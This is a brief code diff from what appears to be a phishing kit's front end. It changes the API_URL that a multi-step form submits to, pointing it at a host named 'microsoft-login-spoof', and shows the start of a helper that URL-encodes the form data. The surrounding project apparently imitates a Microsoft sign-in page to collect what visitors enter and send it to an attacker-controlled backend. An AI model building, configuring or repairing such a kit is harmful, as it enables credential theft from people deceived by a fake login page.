@@ -9,7 +9,7 @@ const prevBtnSec = document.querySelector(".prev-1");
 const submitBtn = document.querySelector(".submit");
 
 // Make sure this points to your API
-const API_URL = 'https://microsoft-login-spoof.onrender.com:10000';
+const API_URL = 'https://microsoft-login-spoof.onrender.com';
 
 const createBody = (data) => {
     let urlEncodedData = "",
